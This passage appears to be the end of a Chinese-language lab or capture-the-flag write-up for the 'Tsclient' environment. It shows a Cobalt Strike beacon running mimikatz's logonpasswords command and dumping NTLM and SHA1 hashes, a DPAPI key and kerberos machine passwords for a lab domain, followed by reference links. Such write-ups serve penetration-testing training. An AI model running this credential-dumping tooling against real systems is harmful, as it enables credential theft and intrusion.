+<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br></pre></td><td class="code"><pre><code class="hljs tap"> beacon&gt; logonpasswords<br>[08/12 02:53:55] [*] Process Inject using fork and run.<br>[08/12 02:53:56] [*] Tasked beacon to run mimikatz&#x27;s sekurlsa::logonpasswords command<br>[08/12 02:53:56] [+] host called home, sent:<span class="hljs-number"> 313860 </span>bytes<br>[08/12 02:53:57] [+] received output:<br><br>Authentication Id :<span class="hljs-number"> 0 </span>;<span class="hljs-number"> 16726317 </span>(00000000:00ff392d)<br>Session           : RemoteInteractive from 2<br>User Name         : Aldrich<br>Domain            : XIAORANG<br>Logon Server      : DC01<br>Logon Time        : 2025/8/12 2:29:01<br>SID               : S-1-5-21-3289074908-3315245560-3429321632-1105<br>    msv :   <br>     [00000003] Primary<br>     * Username : Aldrich<br>     * Domain   : XIAORANG<br>     * NTLM     : 9f12c506328bbee07e9a3f4c1a8fb7de<br>     * SHA1     : 522a58b4a3f08112273007a218ec89bb7c59bc88<br>     * DPAPI    : cb816cb9846399b65e9f663b679af822<br>    tspkg : <br>    wdigest :   <br>     * Username : Aldrich<br>     * Domain   : XIAORANG<br>     * Password : (null)<br>    kerberos :  <br>     * Username : Aldrich<br>     * Domain   : XIAORANG.LAB<br>     * Password : (null)<br>    ssp :   <br>    credman :   <br><br>Authentication Id :<span class="hljs-number"> 0 </span>;<span class="hljs-number"> 996 </span>(00000000:000003e4)<br>Session           : Service from 0<br>User Name         : WIN2016$<br>Domain            : XIAORANG<br>Logon Server      : (null)<br>Logon Time        : 2025/8/12 1:09:19<br>SID               : S-1-5-20<br>    msv :   <br>     [00000003] Primary<br>     * Username : WIN2016$<br>     * Domain   : XIAORANG<br>     * NTLM     : 29231c719dc07970ae7a73127417af9a<br>     * SHA1     : aebdc1013ae9933e52d4c26de794a307b9833c37<br>    tspkg : <br>    wdigest :   <br>     * Username : WIN2016$<br>     * Domain   : XIAORANG<br>     * Password : (null)<br>    kerberos :  <br>     * Username : win2016$<br>     * Domain   : XIAORANG.LAB<br>     * Password :<span class="hljs-number"> 61 </span>19<span class="hljs-number"> 46 </span>89 f3 bd 3d e6 fd 9f 8a<span class="hljs-number"> 47 </span>d4 cf<span class="hljs-number"> 98 </span>da d2 5b 4b b4<span class="hljs-number"> 34 </span>00 cc fa d0<span class="hljs-number"> 51 </span>5c 8a a2 2f<span class="hljs-number"> 13 </span>4e<span class="hljs-number"> 39 </span>c4<span class="hljs-number"> 33 </span>68<span class="hljs-number"> 59 </span>c5 e2 da 2c<span class="hljs-number"> 22 </span>fa b2<span class="hljs-number"> 59 </span>2b fa b1 e4<span class="hljs-number"> 43 </span>ff<span class="hljs-number"> 67 </span>00<span class="hljs-number"> 18 </span>c3<span class="hljs-number"> 81 </span>72<span class="hljs-number"> 68 </span>39 b3<span class="hljs-number"> 14 </span>a9<span class="hljs-number"> 57 </span>31 1b<span class="hljs-number"> 29 </span>fe<span class="hljs-number"> 73 </span>7b f0 b6<span class="hljs-number"> 03 </span>00 e8<span class="hljs-number"> 92 </span>24<span class="hljs-number"> 29 </span>ae<span class="hljs-number"> 16 </span>53 bb 4c<span class="hljs-number"> 59 </span>28<span class="hljs-number"> 39 </span>45 9f df<span class="hljs-number"> 67 </span>00<span class="hljs-number"> 76 </span>97 bc af 7c b9 c0<span class="hljs-number"> 68 </span>fa<span class="hljs-number"> 17 </span>b4<span class="hljs-number"> 69 </span>7c aa f6<span class="hljs-number"> 78 </span>ae<span class="hljs-number"> 67 </span>5b e7<span class="hljs-number"> 51 </span>e1<span class="hljs-number"> 40 </span>a5 6e c9 9b 9a 6f<span class="hljs-number"> 68 </span>01 5d db<span class="hljs-number"> 47 </span>85 ab be<span class="hljs-number"> 89 </span>85<span class="hljs-number"> 38 </span>0a c1<span class="hljs-number"> 01 </span>b3 1b<span class="hljs-number"> 77 </span>11<span class="hljs-number"> 37 </span>c3 0f<span class="hljs-number"> 04 </span>bd<span class="hljs-number"> 40 </span>df<span class="hljs-number"> 94 </span>8d e4 a2 c8<span class="hljs-number"> 43 </span>f1<span class="hljs-number"> 21 </span>03 a0 a6 d6 de<span class="hljs-number"> 09 </span>9a<span class="hljs-number"> 95 </span>3a d7<span class="hljs-number"> 78 </span>b9<span class="hljs-number"> 02 </span>0a<span class="hljs-number"> 09 </span>cc 0a ff 4a<span class="hljs-number"> 68 </span>8a<span class="hljs-number"> 27 </span>88 f9 2c<span class="hljs-number"> 52 </span>98<span class="hljs-number"> 27 </span>bc d3<span class="hljs-number"> 69 </span>33<span class="hljs-number"> 60 </span>24 e2 ed d7<span class="hljs-number"> 72 </span>48<span class="hljs-number"> 39 </span>00<span class="hljs-number"> 95 </span>71 c0<span class="hljs-number"> 33 </span>5f<span class="hljs-number"> 51 </span>68 1d a5<span class="hljs-number"> 83 </span>63<span class="hljs-number"> 37 </span>23 b9 d6 3c c8<span class="hljs-number"> 44 </span>91 fd e0 2c<span class="hljs-number"> 94 </span>ef<span class="hljs-number"> 08 </span>28<span class="hljs-number"> 12 </span>e7 ab<span class="hljs-number"> 82 </span>c3 fa<span class="hljs-number"> 06 </span>f1 f8 1f<span class="hljs-number"> 96 </span>da<span class="hljs-number"> 97 </span>c0 b1 eb 8e<span class="hljs-number"> 08 </span>19 e7<span class="hljs-number"> 80 </span><br>    ssp :   <br>    credman :   <br><br>Authentication Id :<span class="hljs-number"> 0 </span>;<span class="hljs-number"> 16213507 </span>(00000000:00f76603)<br>Session           : Interactive from 2<br>User Name         : DWM-2<br>Domain            : Window Manager<br>Logon Server      : (null)<br>Logon Time        : 2025/8/12 2:23:22<br>SID               : S-1-5-90-0-2<br>    msv :   <br>     [00000003] Primary<br>     * Username : WIN2016$<br>     * Domain   : XIAORANG<br>     * NTLM     : 29231c719dc07970ae7a73127417af9a<br>     * SHA1     : aebdc1013ae9933e52d4c26de794a307b9833c37<br>    tspkg : <br>    wdigest :   <br>     * Username : WIN2016$<br>     * Domain   : XIAORANG<br>     * Password : (null)<br>    kerberos :  <br>     * Username : WIN2016$<br>     * Domain   : xiaorang.lab<br>     * Password :<span class="hljs-number"> 61 </span>19<span class="hljs-number"> 46 </span>89 f3 bd 3d e6 fd 9f 8a<span class="hljs-number"> 47 </span>d4 cf<span class="hljs-number"> 98 </span>da d2 5b 4b b4<span class="hljs-number"> 34 </span>00 cc fa d0<span class="hljs-number"> 51 </span>5c 8a a2 2f<span class="hljs-number"> 13 </span>4e<span class="hljs-number"> 39 </span>c4<span class="hljs-number"> 33 </span>68<span class="hljs-number"> 59 </span>c5 e2 da 2c<span class="hljs-number"> 22 </span>fa b2<span class="hljs-number"> 59 </span>2b fa b1 e4<span class="hljs-number"> 43 </span>ff<span class="hljs-number"> 67 </span>00<span class="hljs-number"> 18 </span>c3<span class="hljs-number"> 81 </span>72<span class="hljs-number"> 68 </span>39 b3<span class="hljs-number"> 14 </span>a9<span class="hljs-number"> 57 </span>31 1b<span class="hljs-number"> 29 </span>fe<span class="hljs-number"> 73 </span>7b f0 b6<span class="hljs-number"> 03 </span>00 e8<span class="hljs-number"> 92 </span>24<span class="hljs-number"> 29 </span>ae<span class="hljs-number"> 16 </span>53 bb 4c<span class="hljs-number"> 59 </span>28<span class="hljs-number"> 39 </span>45 9f df<span class="hljs-number"> 67 </span>00<span class="hljs-number"> 76 </span>97 bc af 7c b9 c0<span class="hljs-number"> 68 </span>fa<span class="hljs-number"> 17 </span>b4<span class="hljs-number"> 69 </span>7c aa f6<span class="hljs-number"> 78 </span>ae<span class="hljs-number"> 67 </span>5b e7<span class="hljs-number"> 51 </span>e1<span class="hljs-number"> 40 </span>a5 6e c9 9b 9a 6f<span class="hljs-number"> 68 </span>01 5d db<span class="hljs-number"> 47 </span>85 ab be<span class="hljs-number"> 89 </span>85<span class="hljs-number"> 38 </span>0a c1<span class="hljs-number"> 01 </span>b3 1b<span class="hljs-number"> 77 </span>11<span class="hljs-number"> 37 </span>c3 0f<span class="hljs-number"> 04 </span>bd<span class="hljs-number"> 40 </span>df<span class="hljs-number"> 94 </span>8d e4 a2 c8<span class="hljs-number"> 43 </span>f1<span class="hljs-number"> 21 </span>03 a0 a6 d6 de<span class="hljs-number"> 09 </span>9a<span class="hljs-number"> 95 </span>3a d7<span class="hljs-number"> 78 </span>b9<span class="hljs-number"> 02 </span>0a<span class="hljs-number"> 09 </span>cc 0a ff 4a<span class="hljs-number"> 68 </span>8a<span class="hljs-number"> 27 </span>88 f9 2c<span class="hljs-number"> 52 </span>98<span class="hljs-number"> 27 </span>bc d3<span class="hljs-number"> 69 </span>33<span class="hljs-number"> 60 </span>24 e2 ed d7<span class="hljs-number"> 72 </span>48<span class="hljs-number"> 39 </span>00<span class="hljs-number"> 95 </span>71 c0<span class="hljs-number"> 33 </span>5f<span class="hljs-number"> 51 </span>68 1d a5<span class="hljs-number"> 83 </span>63<span class="hljs-number"> 37 </span>23 b9 d6 3c c8<span class="hljs-number"> 44 </span>91 fd e0 2c<span class="hljs-number"> 94 </span>ef<span class="hljs-number"> 08 </span>28<span class="hljs-number"> 12 </span>e7 ab<span class="hljs-number"> 82 </span>c3 fa<span class="hljs-number"> 06 </span>f1 f8 1f<span class="hljs-number"> 96 </span>da<span class="hljs-number"> 97 </span>c0 b1 eb 8e<span class="hljs-number"> 08 </span>19 e7<span class="hljs-number"> 80 </span><br>    ssp :   <br>    credman :   <br><br>Authentication Id :<span class="hljs-number"> 0 </span>;<span class="hljs-number"> 16213484 </span>(00000000:00f765ec)<br>Session           : Interactive from 2<br>User Name         : DWM-2<br>Domain            : Window Manager<br>Logon Server      : (null)<br>Logon Time        : 2025/8/12 2:23:22<br>SID               : S-1-5-90-0-2<br>    msv :   <br>     [00000003] Primary<br>     * Username : WIN2016$<br>     * Domain   : XIAORANG<br>     * NTLM     : 29231c719dc07970ae7a73127417af9a<br>     * SHA1     : aebdc1013ae9933e52d4c26de794a307b9833c37<br>    tspkg : <br>    wdigest :   <br>     * Username : WIN2016$<br>     * Domain   : XIAORANG<br>     * Password : (null)<br>    kerberos :  <br>     * Username : WIN2016$<br>     * Domain   : xiaorang.lab<br>     * Password :<span class="hljs-number"> 61 </span>19<span class="hljs-number"> 46 </span>89 f3 bd 3d e6 fd 9f 8a<span class="hljs-number"> 47 </span>d4 cf<span class="hljs-number"> 98 </span>da d2 5b 4b b4<span class="hljs-number"> 34 </span>00 cc fa d0<span class="hljs-number"> 51 </span>5c 8a a2 2f<span class="hljs-number"> 13 </span>4e<span class="hljs-number"> 39 </span>c4<span class="hljs-number"> 33 </span>68<span class="hljs-number"> 59 </span>c5 e2 da 2c<span class="hljs-number"> 22 </span>fa b2<span class="hljs-number"> 59 </span>2b fa b1 e4<span class="hljs-number"> 43 </span>ff<span class="hljs-number"> 67 </span>00<span class="hljs-number"> 18 </span>c3<span class="hljs-number"> 81 </span>72<span class="hljs-number"> 68 </span>39 b3<span class="hljs-number"> 14 </span>a9<span class="hljs-number"> 57 </span>31 1b<span class="hljs-number"> 29 </span>fe<span class="hljs-number"> 73 </span>7b f0 b6<span class="hljs-number"> 03 </span>00 e8<span class="hljs-number"> 92 </span>24<span class="hljs-number"> 29 </span>ae<span class="hljs-number"> 16 </span>53 bb 4c<span class="hljs-number"> 59 </span>28<span class="hljs-number"> 39 </span>45 9f df<span class="hljs-number"> 67 </span>00<span class="hljs-number"> 76 </span>97 bc af 7c b9 c0<span class="hljs-number"> 68 </span>fa<span class="hljs-number"> 17 </span>b4<span class="hljs-number"> 69 </span>7c aa f6<span class="hljs-number"> 78 </span>ae<span class="hljs-number"> 67 </span>5b e7<span class="hljs-number"> 51 </span>e1<span class="hljs-number"> 40 </span>a5 6e c9 9b 9a 6f<span class="hljs-number"> 68 </span>01 5d db<span class="hljs-number"> 47 </span>85 ab be<span class="hljs-number"> 89 </span>85<span class="hljs-number"> 38 </span>0a c1<span class="hljs-number"> 01 </span>b3 1b<span class="hljs-number"> 77 </span>11<span class="hljs-number"> 37 </span>c3 0f<span class="hljs-number"> 04 </span>bd<span class="hljs-number"> 40 </span>df<span class="hljs-number"> 94 </span>8d e4 a2 c8<span class="hljs-number"> 43 </span>f1<span class="hljs-number"> 21 </span>03 a0 a6 d6 de<span class="hljs-number"> 09 </span>9a<span class="hljs-number"> 95 </span>3a d7<span class="hljs-number"> 78 </span>b9<span class="hljs-number"> 02 </span>0a<span class="hljs-number"> 09 </span>cc 0a ff 4a<span class="hljs-number"> 68 </span>8a<span class="hljs-number"> 27 </span>88 f9 2c<span class="hljs-number"> 52 </span>98<span class="hljs-number"> 27 </span>bc d3<span class="hljs-number"> 69 </span>33<span class="hljs-number"> 60 </span>24 e2 ed d7<span class="hljs-number"> 72 </span>48<span class="hljs-number"> 39 </span>00<span class="hljs-number"> 95 </span>71 c0<span class="hljs-number"> 33 </span>5f<span class="hljs-number"> 51 </span>68 1d a5<span class="hljs-number"> 83 </span>63<span class="hljs-number"> 37 </span>23 b9 d6 3c c8<span class="hljs-number"> 44 </span>91 fd e0 2c<span class="hljs-number"> 94 </span>ef<span class="hljs-number"> 08 </span>28<span class="hljs-number"> 12 </span>e7 ab<span class="hljs-number"> 82 </span>c3 fa<span class="hljs-number"> 06 </span>f1 f8 1f<span class="hljs-number"> 96 </span>da<span class="hljs-number"> 97 </span>c0 b1 eb 8e<span class="hljs-number"> 08 </span>19 e7<span class="hljs-number"> 80 </span><br>    ssp :   <br>    credman :   <br><br>Authentication Id :<span class="hljs-number"> 0 </span>;<span class="hljs-number"> 995 </span>(00000000:000003e3)<br>Session           : Service from 0<br>User Name         : IUSR<br>Domain            : NT AUTHORITY<br>Logon Server      : (null)<br>Logon Time        : 2025/8/12 1:09:23<br>SID               : S-1-5-17<br>    msv :   <br>    tspkg : <br>    wdigest :   <br>     * Username : (null)<br>     * Domain   : (null)<br>     * Password : (null)<br>    kerberos :  <br>    ssp :   <br>    credman :   <br><br>Authentication Id :<span class="hljs-number"> 0 </span>;<span class="hljs-number"> 997 </span>(00000000:000003e5)<br>Session           : Service from 0<br>User Name         : LOCAL SERVICE<br>Domain            : NT AUTHORITY<br>Logon Server      : (null)<br>Logon Time        : 2025/8/12 1:09:20<br>SID               : S-1-5-19<br>    msv :   <br>    tspkg : <br>    wdigest :   <br>     * Username : (null)<br>     * Domain   : (null)<br>     * Password : (null)<br>    kerberos :  <br>     * Username : (null)<br>     * Domain   : (null)<br>     * Password : (null)<br>    ssp :   <br>    credman :   <br><br>Authentication Id :<span class="hljs-number"> 0 </span>;<span class="hljs-number"> 54488 </span>(00000000:0000d4d8)<br>Session           : Interactive from 1<br>User Name         : DWM-1<br>Domain            : Window Manager<br>Logon Server      : (null)<br>Logon Time        : 2025/8/12 1:09:20<br>SID               : S-1-5-90-0-1<br>    msv :   <br>     [00000003] Primary<br>     * Username : WIN2016$<br>     * Domain   : XIAORANG<br>     * NTLM     : 4ba974f170ab0fe1a8a1eb0ed8f6fe1a<br>     * SHA1     : e06238ecefc14d675f762b08a456770dc000f763<br>    tspkg : <br>    wdigest :   <br>     * Username : WIN2016$<br>     * Domain   : XIAORANG<br>     * Password : (null)<br>    kerberos :  <br>     * Username : WIN2016$<br>     * Domain   : xiaorang.lab<br>     * Password : 9e ae c4 7a ed ee<span class="hljs-number"> 91 </span>74 a5<span class="hljs-number"> 59 </span>61 a5<span class="hljs-number"> 00 </span>2c c5<span class="hljs-number"> 00 </span>60 3b<span class="hljs-number"> 87 </span>48 d0<span class="hljs-number"> 17 </span>48 cf df 7b<span class="hljs-number"> 14 </span>af 9a<span class="hljs-number"> 99 </span>22 b5<span class="hljs-number"> 94 </span>ba 0a 1e f0 6e f0<span class="hljs-number"> 25 </span>b1 e2 a2<span class="hljs-number"> 62 </span>fb b8<span class="hljs-number"> 68 </span>93<span class="hljs-number"> 42 </span>64<span class="hljs-number"> 08 </span>b7 f6 2e f7 cf ae a3 7a<span class="hljs-number"> 94 </span>9d<span class="hljs-number"> 32 </span>24 1a b1 6b<span class="hljs-number"> 87 </span>6c 5e f1 d3<span class="hljs-number"> 89 </span>c6 c4 8b d3 bd<span class="hljs-number"> 05 </span>9c b0 e1<span class="hljs-number"> 85 </span>d4 2c<span class="hljs-number"> 03 </span>56 5f af<span class="hljs-number"> 09 </span>15<span class="hljs-number"> 12 </span>10 df<span class="hljs-number"> 74 </span>e7 4c d3<span class="hljs-number"> 65 </span>55 d8 ab bd b4<span class="hljs-number"> 71 </span>5c 8c a7 bd<span class="hljs-number"> 14 </span>60 8b<span class="hljs-number"> 44 </span>b5 d8 d8<span class="hljs-number"> 61 </span>23 f1 4f 4d 8e a0 dc ac 8a<span class="hljs-number"> 60 </span>15 0d f7 9f a1<span class="hljs-number"> 85 </span>98 c4 cf<span class="hljs-number"> 34 </span>ec ee ea c5 b9 5b<span class="hljs-number"> 42 </span>8b<span class="hljs-number"> 97 </span>cc 4d ed 1f db 8c b4<span class="hljs-number"> 45 </span>06 ce<span class="hljs-number"> 40 </span>fc<span class="hljs-number"> 81 </span>96 ac c3<span class="hljs-number"> 61 </span>e5 e9<span class="hljs-number"> 42 </span>90<span class="hljs-number"> 69 </span>f3 b2<span class="hljs-number"> 85 </span>fa<span class="hljs-number"> 80 </span>59 e2 8b a5 f6<span class="hljs-number"> 70 </span>5d 1a bd 5f b1<span class="hljs-number"> 85 </span>6b ae b0<span class="hljs-number"> 16 </span>42<span class="hljs-number"> 29 </span>2c<span class="hljs-number"> 99 </span>57 fb<span class="hljs-number"> 49 </span>ea e3<span class="hljs-number"> 29 </span>49<span class="hljs-number"> 56 </span>55 6c 9a 2b ee<span class="hljs-number"> 13 </span>77 fe d7 a3<span class="hljs-number"> 51 </span>b8<span class="hljs-number"> 01 </span>ec bb<span class="hljs-number"> 60 </span>22 b8 7c 2f f5 6b 0f 6b<span class="hljs-number"> 87 </span>36<span class="hljs-number"> 76 </span>45<span class="hljs-number"> 81 </span>7e e3<span class="hljs-number"> 71 </span>0a a8 ca 2a a3 a6<span class="hljs-number"> 05 </span>64 <br>    ssp :   <br>    credman :   <br><br>Authentication Id :<span class="hljs-number"> 0 </span>;<span class="hljs-number"> 54458 </span>(00000000:0000d4ba)<br>Session           : Interactive from 1<br>User Name         : DWM-1<br>Domain            : Window Manager<br>Logon Server      : (null)<br>Logon Time        : 2025/8/12 1:09:20<br>SID               : S-1-5-90-0-1<br>    msv :   <br>     [00000003] Primary<br>     * Username : WIN2016$<br>     * Domain   : XIAORANG<br>     * NTLM     : 29231c719dc07970ae7a73127417af9a<br>     * SHA1     : aebdc1013ae9933e52d4c26de794a307b9833c37<br>    tspkg : <br>    wdigest :   <br>     * Username : WIN2016$<br>     * Domain   : XIAORANG<br>     * Password : (null)<br>    kerberos :  <br>     * Username : WIN2016$<br>     * Domain   : xiaorang.lab<br>     * Password :<span class="hljs-number"> 61 </span>19<span class="hljs-number"> 46 </span>89 f3 bd 3d e6 fd 9f 8a<span class="hljs-number"> 47 </span>d4 cf<span class="hljs-number"> 98 </span>da d2 5b 4b b4<span class="hljs-number"> 34 </span>00 cc fa d0<span class="hljs-number"> 51 </span>5c 8a a2 2f<span class="hljs-number"> 13 </span>4e<span class="hljs-number"> 39 </span>c4<span class="hljs-number"> 33 </span>68<span class="hljs-number"> 59 </span>c5 e2 da 2c<span class="hljs-number"> 22 </span>fa b2<span class="hljs-number"> 59 </span>2b fa b1 e4<span class="hljs-number"> 43 </span>ff<span class="hljs-number"> 67 </span>00<span class="hljs-number"> 18 </span>c3<span class="hljs-number"> 81 </span>72<span class="hljs-number"> 68 </span>39 b3<span class="hljs-number"> 14 </span>a9<span class="hljs-number"> 57 </span>31 1b<span class="hljs-number"> 29 </span>fe<span class="hljs-number"> 73 </span>7b f0 b6<span class="hljs-number"> 03 </span>00 e8<span class="hljs-number"> 92 </span>24<span class="hljs-number"> 29 </span>ae<span class="hljs-number"> 16 </span>53 bb 4c<span class="hljs-number"> 59 </span>28<span class="hljs-number"> 39 </span>45 9f df<span class="hljs-number"> 67 </span>00<span class="hljs-number"> 76 </span>97 bc af 7c b9 c0<span class="hljs-number"> 68 </span>fa<span class="hljs-number"> 17 </span>b4<span class="hljs-number"> 69 </span>7c aa f6<span class="hljs-number"> 78 </span>ae<span class="hljs-number"> 67 </span>5b e7<span class="hljs-number"> 51 </span>e1<span class="hljs-number"> 40 </span>a5 6e c9 9b 9a 6f<span class="hljs-number"> 68 </span>01 5d db<span class="hljs-number"> 47 </span>85 ab be<span class="hljs-number"> 89 </span>85<span class="hljs-number"> 38 </span>0a c1<span class="hljs-number"> 01 </span>b3 1b<span class="hljs-number"> 77 </span>11<span class="hljs-number"> 37 </span>c3 0f<span class="hljs-number"> 04 </span>bd<span class="hljs-number"> 40 </span>df<span class="hljs-number"> 94 </span>8d e4 a2 c8<span class="hljs-number"> 43 </span>f1<span class="hljs-number"> 21 </span>03 a0 a6 d6 de<span class="hljs-number"> 09 </span>9a<span class="hljs-number"> 95 </span>3a d7<span class="hljs-number"> 78 </span>b9<span class="hljs-number"> 02 </span>0a<span class="hljs-number"> 09 </span>cc 0a ff 4a<span class="hljs-number"> 68 </span>8a<span class="hljs-number"> 27 </span>88 f9 2c<span class="hljs-number"> 52 </span>98<span class="hljs-number"> 27 </span>bc d3<span class="hljs-number"> 69 </span>33<span class="hljs-number"> 60 </span>24 e2 ed d7<span class="hljs-number"> 72 </span>48<span class="hljs-number"> 39 </span>00<span class="hljs-number"> 95 </span>71 c0<span class="hljs-number"> 33 </span>5f<span class="hljs-number"> 51 </span>68 1d a5<span class="hljs-number"> 83 </span>63<span class="hljs-number"> 37 </span>23 b9 d6 3c c8<span class="hljs-number"> 44 </span>91 fd e0 2c<span class="hljs-number"> 94 </span>ef<span class="hljs-number"> 08 </span>28<span class="hljs-number"> 12 </span>e7 ab<span class="hljs-number"> 82 </span>c3 fa<span class="hljs-number"> 06 </span>f1 f8 1f<span class="hljs-number"> 96 </span>da<span class="hljs-number"> 97 </span>c0 b1 eb 8e<span class="hljs-number"> 08 </span>19 e7<span class="hljs-number"> 80 </span><br>    ssp :   <br>    credman :   <br><br>Authentication Id :<span class="hljs-number"> 0 </span>;<span class="hljs-number"> 25403 </span>(00000000:0000633b)<br>Session           : UndefinedLogonType from 0<br>User Name         : (null)<br>Domain            : (null)<br>Logon Server      : (null)<br>Logon Time        : 2025/8/12 1:09:19<br>SID               : <br>    msv :   <br>     [00000003] Primary<br>     * Username : WIN2016$<br>     * Domain   : XIAORANG<br>     * NTLM     : 29231c719dc07970ae7a73127417af9a<br>     * SHA1     : aebdc1013ae9933e52d4c26de794a307b9833c37<br>    tspkg : <br>    wdigest :   <br>    kerberos :  <br>    ssp :   <br>    credman :   <br><br>Authentication Id :<span class="hljs-number"> 0 </span>;<span class="hljs-number"> 999 </span>(00000000:000003e7)<br>Session           : UndefinedLogonType from 0<br>User Name         : WIN2016$<br>Domain            : XIAORANG<br>Logon Server      : (null)<br>Logon Time        : 2025/8/12 1:09:19<br>SID               : S-1-5-18<br>    msv :   <br>    tspkg : <br>    wdigest :   <br>     * Username : WIN2016$<br>     * Domain   : XIAORANG<br>     * Password : (null)<br>    kerberos :  <br>     * Username : win2016$<br>     * Domain   : XIAORANG.LAB<br>     * Password : (null)<br>    ssp :   <br>    credman :   <br></code></pre></td></tr></table></figure>
+
+<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/616582468">https://zhuanlan.zhihu.com/p/616582468</a></p>
+<p><a target="_blank" rel="noopener" href="https://zer0peach.github.io/2024/11/28/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/#%E7%BB%A7%E7%BB%AD-1">https://zer0peach.github.io/2024/11/28/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/#%E7%BB%A7%E7%BB%AD-1</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/352237.html">https://www.freebuf.com/articles/system/352237.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/kingbridge/articles/17645128.html#%E9%9D%9E%E9%A2%84%E6%9C%9F">https://www.cnblogs.com/kingbridge/articles/17645128.html#%E9%9D%9E%E9%A2%84%E6%9C%9F</a></p>
+<p><a target="_blank" rel="noopener" href="https://exp10it.io/2023/07/chunqiuyunjing-tsclient-writeup/#flag02">https://exp10it.io/2023/07/chunqiuyunjing-tsclient-writeup/#flag02</a></p>
+<p><a target="_blank" rel="noopener" href="https://mashiro726.github.io/2025/02/11/Tsclient/#">https://mashiro726.github.io/2025/02/11/Tsclient/#</a></p>
